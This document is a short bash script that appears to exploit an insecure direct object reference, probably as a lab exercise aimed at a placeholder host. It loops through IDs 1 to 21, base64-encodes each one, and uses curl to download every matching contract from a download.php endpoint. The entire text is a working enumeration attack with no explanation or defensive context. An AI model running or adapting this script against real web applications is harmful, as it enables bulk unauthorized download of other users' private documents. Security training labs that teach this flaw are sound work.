#!/bin/bash

for i in {1..21}; do
    for hash in $(echo -n $i | base64 -w 0 | tr -d ' -'); do
        curl -sOJ -X GET http://IP:PORT/download.php?contract=$hash
    done
done
